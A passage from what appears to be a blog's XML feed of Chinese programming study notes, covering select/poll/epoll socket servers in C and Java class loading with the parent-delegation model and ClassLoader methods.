htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">listenfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(listenfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(listenfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">fd_set rset,allset; <span class="comment">//定义 读集合，备份集合allset</span></span><br><span class="line">FD_ZERO(&amp;allset);  <span class="comment">//清空监听集合</span></span><br><span class="line">FD_SET(listenfd,&amp;allset); <span class="comment">//将待监听fd添加到监听集合中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret,maxfd = <span class="number">0</span>,i,n,j;</span><br><span class="line">maxfd = listenfd; <span class="comment">//最大文件描述符</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">rset = allset;  <span class="comment">//备份</span></span><br><span class="line">ret = select(maxfd+<span class="number">1</span>,&amp;rset,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>); <span class="comment">//使用select监听</span></span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"select error"</span>);</span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(listenfd,&amp;rset))&#123; <span class="comment">//listenfd满足监听的读事件</span></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line">connfd = Accept(listenfd,(struct sockaddr*)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">FD_SET(connfd,&amp;allset); <span class="comment">//将新产生的fd添加到监听集合中，监听数据读事件</span></span><br><span class="line"><span class="keyword">if</span>(maxfd &lt; connfd) <span class="comment">//修改maxfd</span></span><br><span class="line">maxfd = connfd;</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">1</span>) <span class="comment">//说明select只返回一个，并且是listenfd，后续指令无需执行</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=listenfd+<span class="number">1</span>;i&lt;=maxfd;i++)&#123; <span class="comment">//处理满足读事件的fd</span></span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(i,&amp;rset))&#123; <span class="comment">//找到满足读事件的那个fd</span></span><br><span class="line">n = read(i,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)&#123; <span class="comment">//检测到客户端已经关闭连接</span></span><br><span class="line">Close(i);</span><br><span class="line">FD_CLR(i,&amp;allset); <span class="comment">//将关闭的fd移除出监听集合</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"read error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">buf[j] = <span class="built_in">toupper</span>(buf[j]);</span><br><span class="line">write(i,buf,n);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Close(listenfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义文件头<code>wrap.h</code>和封装函数<code>wrap.c</code>代码和之前的相同。</p><h5 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd *fds, <span class="keyword">nfds_t</span> nfds,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  fds: 监听的文件描述符数组</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span>&#123;</span></span><br><span class="line">      <span class="keyword">int</span> fd: 待监听的文件描述符</span><br><span class="line">      short events: 待监听的文件描述符对应的监听事件(POLLIN、POLLOUT、POLLERR)</span><br><span class="line">      short revents: 传入时，给<span class="number">0</span>。如果满足对应事件的话，返回非<span class="number">0</span>(POLLIN、POLLOUT、POLLERR)</span><br><span class="line">    &#125;</span><br><span class="line">  nfds: 监听数组的，实际有效监听个数</span><br><span class="line">  timeout: 超时时长</span><br><span class="line">    &gt;<span class="number">0</span>: 设置监听超时时长</span><br><span class="line">    <span class="number">-1</span>: 阻塞监听</span><br><span class="line">    <span class="number">0</span>: 非阻塞监听，轮询</span><br><span class="line">返回值</span><br><span class="line">    &gt;<span class="number">0</span> : 所有监听集合中，满足对应事件的总数</span><br><span class="line">    <span class="number">0</span> : 没有满足监听条件的文件描述符</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><p>read函数返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="number">0</span>: 实际读到的字节数</span><br><span class="line">=<span class="number">0</span>: socket中，表示对端关闭。close()</span><br><span class="line"><span class="number">-1</span>: 如果errno == EINTR 被异常中断，需要重启</span><br><span class="line">  如果errno == EAGAIN或EWOULDBLOCK 以非阻塞方式读数据，但是没有数据。需要再次读</span><br><span class="line">  如果errno == ECONNRESET 说明连接被重置，需要close()。移除监听队列</span><br></pre></td></tr></table></figure><p>poll的优点：</p><ul><li><p>自带数组结构。可以将监听事件集合和返回事件集合分离</p></li><li><p>扩展 监听上限，超出1024限制</p></li></ul><p>缺点</p><ul><li>不能跨平台。只能在Linux下使用</li><li>无法直接定位满足监听事件的文件描述符，编码难度较大</li></ul><h5 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line">  size: 创建的红黑树的监听节点数量(仅供内核参考)</span><br><span class="line">  返回值: 指向新创建的红黑树的根节点的fd。失败返回<span class="number">-1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd,<span class="keyword">int</span> op,<span class="keyword">int</span> fd,struct epoll_event *event)</span></span></span><br><span class="line">  epfd: epoll_create函数的返回值 epfd</span><br><span class="line">  op: 对该监听红黑树所做的操作</span><br><span class="line">    EPOLL_CTL_ADD 添加fd到 监听红黑树</span><br><span class="line">    EPOLL_CTL_MOD 修改fd在 监听红黑树上的监听事件</span><br><span class="line">    EPOLL_CTL_DEL 将一个fd从 监听红黑树上摘下(取消监听)</span><br><span class="line">  fd: 待监听的fd</span><br><span class="line">  event: 本质 <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> 结构体</span></span><br><span class="line"><span class="class">     <span class="title">events</span>:</span></span><br><span class="line">EPOLLIN、EPOLLOUT、EPOLLERR</span><br><span class="line"> data: 联合体</span><br><span class="line">           <span class="keyword">int</span> fd: 对应监听事件的fd</span><br><span class="line">           <span class="keyword">void</span> *ptr</span><br><span class="line">           <span class="keyword">uint32_t</span> u32 </span><br><span class="line">           <span class="keyword">uint64_t</span> u64</span><br><span class="line"> 返回值: 成功<span class="number">0</span> 失败返回<span class="number">-1</span> 设置errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd,struct epoll_event *events,<span class="keyword">int</span> maxevents,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line">  epfd: epoll_create函数的返回值 epfd</span><br><span class="line">  events: 传出参数，数组，满足监听条件的fd结构体</span><br><span class="line">  maxevents: 数组元素的总个数</span><br><span class="line">  timeout: </span><br><span class="line">    &gt;<span class="number">0</span>: 设置监听超时时长(毫秒)</span><br><span class="line">    <span class="number">-1</span>: 阻塞监听</span><br><span class="line">    <span class="number">0</span>: 非阻塞监听，轮询</span><br><span class="line">  返回值:</span><br><span class="line">&gt;<span class="number">0</span>: 满足监听的总个数，可以用作循环上限</span><br><span class="line">     <span class="number">0</span>: 没有fd满足监听事件</span><br><span class="line">    <span class="number">-1</span>: 失败。errno</span><br></pre></td></tr></table></figure><h5 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h5><p>EPOLL事件有两种模型</p><ul><li><p>Edge Triggered(ET)：边缘触发只有数据到来才触发，不管缓存区中是否还有数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">event.events = EPOLLIN | EPOLLET;</span><br></pre></td></tr></table></figure></li><li><p>Level Triggered(LT)：水平触发只要有数据都会触发</p></li></ul><h5 id="epoll反应堆模型"><a href="#epoll反应堆模型" class="headerlink" title="epoll反应堆模型"></a>epoll反应堆模型</h5><p>原来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket、bind、listen -- epoll_create创建监听红黑树 -- 返回epfd -- epoll_ctl()向树上添加一个监听fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_wait监听 -- 对应监听fd有事件产生 -- 返回监听满足数组 -- 判断返回数组元素 -- lfd满足 -- Accept -- cfd满足 -- read() -- 小写转大写 -- write回去</span><br></pre></td></tr></table></figure><p>反应堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket、bind、listen -- epoll_create创建监听红黑树 -- 返回epfd -- epoll_ctl()向树上添加一个监听fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_wait监听 -- 对应监听fd有事件产生 -- 返回监听满足数组 -- 判断返回数组元素 -- lfd满足 -- Accept -- cfd满足 -- read() -- 小写转大写 -- cfd从监听红黑树上摘下 -- EPOLLOUT -- 回调函数 -- epoll_ctl() -- PEOLL_CTL_ADD 重新放到红黑树上监听写事件 -- epoll_ctl() -- EPOLL_CTL_ADD 重新放到红黑树上监听读事件 -- epoll_wait监听</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Socket编程&quot;&gt;&lt;a href=&quot;#Socket编程&quot; class=&quot;headerlink&quot; title=&quot;Socket编程&quot;&gt;&lt;/a&gt;Socket编程&lt;/h4&gt;&lt;h5 id=&quot;套接字概念&quot;&gt;&lt;a href=&quot;#套接字概念&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java类加载</title>
    <link href="elssm.github.io/2021/10/30/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>elssm.github.io/2021/10/30/Java类加载/</id>
    <published>2021-10-30T14:47:18.000Z</published>
    <updated>2021-10-31T10:04:12.792Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类的加载概述"><a href="#类的加载概述" class="headerlink" title="类的加载概述"></a>类的加载概述</h4><p>我们编写的<code>.java</code>扩展名的源代码文件存储着要执行的程序逻辑，这些文件需要经过<code>java</code>编译器编译成<code>.class</code>文件，<code>.class</code>文件中存放着编译后虚拟机指令的二进制信息。当需要用到某个类时，虚拟机将会加载它，并在内存中创建对应的<code>class</code>对象，这个过程称之为类的加载。一个类的生命周期从类被加载、连接和初始化开始，只有在虚拟机内存中，我们的<code>java</code>程序才可以使用它。</p><p><img src="/2021/10/30/Java类加载/1.png" alt="1"></p><h5 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h5><p>通过类的完全限定名(包名和类名)查找此类的字节码文件，把类的<code>.class</code>文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区中，然后利用字节码文件创建一个<code>Class</code>对象，用来封装类在方法区内的数据结构并存放在堆区内，这个过程是由类加载器完成的。</p><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><ul><li>验证：确保被加载类的正确性。<code>Class</code>文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身安全。</li><li>准备：为类的静态变量分配内存，并将其初始化为默认值，此阶段仅仅只为静态变量(即<code>static</code>修饰的字段变量)分配内存，并且设置该变量的初始值。对于<code>final static</code>修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。</li><li>解析：把类中的符号引用转换为直接引用，符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</li></ul><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。</p><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>类的加载是由类加载器完成的，类加载器可以分为两种：第一种是Java虚拟机自带的类加载器，分别为启动类加载器、扩展类加载器和系统类加载器。第二种是用户自定义的类加载器，是<code>java.lang.ClassLoader</code>的子类实例。</p><h5 id="虚拟机内置类加载器"><a href="#虚拟机内置类加载器" class="headerlink" title="虚拟机内置类加载器"></a>虚拟机内置类加载器</h5><h6 id="根类加载器-Bootstrap"><a href="#根类加载器-Bootstrap" class="headerlink" title="根类加载器(Bootstrap)"></a>根类加载器(Bootstrap)</h6><p>根类加载器是最底层的类加载器，是虚拟机的一部分。它是由C++语言实现的，且没有父加载器，也没有继承<code>java.lang.ClassLoader</code>类。它主要负责加载由系统属性<code>sun.boot.class.path</code>指定的路径下的核心类库，出于安全考虑，根类加载器只加载<code>java、javax、sun</code>开头的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ClassLoader cl = Object<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">  System.out.println(cl); <span class="comment">//根类加载器打印出来的结果是null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是打印出<code>null</code>的原因是由于<code>BootStrapClassLoader</code>是用c++写的，使用原生代码来实现，并不继承于<code>java.lang.ClassLoader</code>，所以在返回该<code>ClassLoader</code>时就会返回<code>null</code>。</p><h6 id="扩展类加载器-Extension"><a href="#扩展类加载器-Extension" class="headerlink" title="扩展类加载器(Extension)"></a>扩展类加载器(Extension)</h6><p>扩展类加载器是指原SUN公司实现的<code>sun.misc.launcher$ExtClassLoader</code>类(JDK8)，它是由java语言编写，父加载器是根类加载器，负责加载<code>&lt;JAVA_HOME&gt;\jre\lib\ext</code>目录下的类库或者系统变量<code>java.ext.dirs</code>指定的目录下的类库。</p><p>测试<code>dnsns.jar</code>下类的类加载器，因为该<code>jar</code>包在<code>jre\lib\ext</code>目录下</p><p><img src="/2021/10/30/Java类加载/2.png" alt="2"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = DNSNameService<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"DNSNameService类的类加载器是: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/30/Java类加载/3.png" alt="3"></p><h6 id="系统类加载器-System"><a href="#系统类加载器-System" class="headerlink" title="系统类加载器(System)"></a>系统类加载器(System)</h6><p>系统类加载器也称之为应用类加载器，也是纯Java类，是原SUN公司实现的<code>sun.misc.Launcher$AppClassLoader</code>类(JDK8)。它的父加载器是扩展类加载器，它负责从<code>classpath</code>环境变量或者系统属性<code>java.class.path</code>所指定的目录中加载类，它是用户自定义的类加载器的默认父加载器。一般情况下，该类加载器是程序中默认的类加载器，可以通过<code>ClassLoader.getSystemClassLoader()</code>直接获得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTest类的类加载器是: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自己编写的类使用的类加载器结果为<code>sun.misc.Launcher$AppClassLoader</code></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>在程序开发中，类的加载几乎是由上述3种类加载器相互配合执行的，同时我们还可以自定义类加载器。需要注意的是，Java虚拟机对<code>class</code>文件采用的是按需加载的方式，也就是说当需要使用该类时才会将它的<code>class</code>文件加载到内存生成<code>class</code>对象，而且加载某个类的<code>class</code>文件时，Java虚拟机采用的是双亲委派模式，即把加载类的请求交由父加载器处理，它是一种任务委派模式。</p><h4 id="类加载器的双亲委派机制"><a href="#类加载器的双亲委派机制" class="headerlink" title="类加载器的双亲委派机制"></a>类加载器的双亲委派机制</h4><p>除了根类加载器之外，其他的类加载器都需要有自己的父加载器。从<code>JDK1.2</code>开始，类的加载过程采用双亲委派机制，这种机制能够很好的保护Java程序的安全，除了虚拟机自带的根类加载器之外，其余的类加载器都有唯一的父加载器，比如，如果需要<code>ClassLoader</code>加载一个类时，该<code>ClassLoader</code>先委托自己的父加载器先去加载这个类，若父加载器能够加载，则由父加载器加载，否则才由<code>ClassLoader</code>自己加载这个类。真正加载类的加载器我们叫做启动类加载器，注意，双亲委派机制的父子关系并非面向对象程序设计中的继承关系，而是通过使用组合模式来复用父加载器代码，这种机制如下图所示</p><p><img src="/2021/10/30/Java类加载/4.png" alt="4"></p><p>测试自定义类的类加载器的父子关系，通过<code>getParent()</code>来获取父类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTest类的类加载器是: "</span>+classLoader);</span><br><span class="line">        <span class="keyword">while</span> (classLoader!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(classLoader);</span><br><span class="line">            classLoader = classLoader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印出的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassLoaderTest类的类加载器是: sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$ExtClassLoader</span><br></pre></td></tr></table></figure><h5 id="双亲委派机制的好处"><a href="#双亲委派机制的好处" class="headerlink" title="双亲委派机制的好处"></a>双亲委派机制的好处</h5><ul><li>可以避免类的重复加载，当父类加载器已经加载了该类时，就没有必要子<code>ClassLoader</code>再加载一次。</li><li>考虑到安全因素，Java核心<code>API</code>种定义类型不会被随意替换，假设通过网络传递一个名为<code>java.lang.Object</code>的类，通过双亲委派模式传递到启动类加载器，而启动类加载器在Java核心<code>API</code>发现这个名字的类，发现该类已经被加载，并不会重新加载网络传递过来的<code>java.lang.Object</code>，而直接返回已加载过的<code>Objec.class</code>，这样便可以防止核心<code>API</code>库被随意篡改。</li></ul><h4 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h4><p>所有的类加载器(除了根类加载器)都必须继承<code>java.lang.ClassLoader</code>，它是一个抽象类，主要的方法如下</p><h5 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h5><p>在<code>ClassLoader</code>的源码中，有一个方法<code>loadClass(String name, boolean resolve)</code>，这里就是双亲委派模式的代码实现。从源码中我们可以观察到它的执行顺序，需要注意的是，只有父类加载器加载不到类时，会调用<code>findClass</code>方法进行类的查找，所以在定义自己的类加载器时，不要覆盖掉该方法，而应该覆盖掉<code>findClass</code>方法。</p><p><code>ClassLoader</code>类的<code>loadClass</code>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中，首先会通过<code>findLoadClass</code>方法检查类是否已经被加载。如果没有被加载，就会执行双亲委派模式，通过父类去加载，即在父类上调用<code>loadClass</code>方法，如果父类加载不到的话，则使用虚拟机的内置类加载器，如果都没有加载成功，就会通过自己的<code>findClass</code>方法去加载。</p><h5 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h5><p>在自定义类加载器时，一般我们需要覆盖这个方法，且<code>ClassLoader</code>中给出了一个默认的错误实现。如果我们覆盖了这个方法，则会调用我们自己写的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>该方法用来将<code>byte</code>字节解析成虚拟机能够识别的<code>Class</code>对象，<code>defineClass()</code>方法通常与<code>findClass()</code>方法一起使用。在自定义类加载器时，会直接覆盖<code>ClassLoader</code>的<code>findClass()</code>方法获取要加载类的字节码，然后调用<code>defineClass()</code>方法生成<code>Class</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><p>连接指定的类，类加载器可以使用此方法来连接类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>在<code>java.net</code>包中，JDK提供了一个更加易用的类加载器<code>URLClassLoader</code>，它扩展了<code>ClassLoader</code>，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。</p><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls)</span> </span>&#123;</span><br><span class="line">        <span 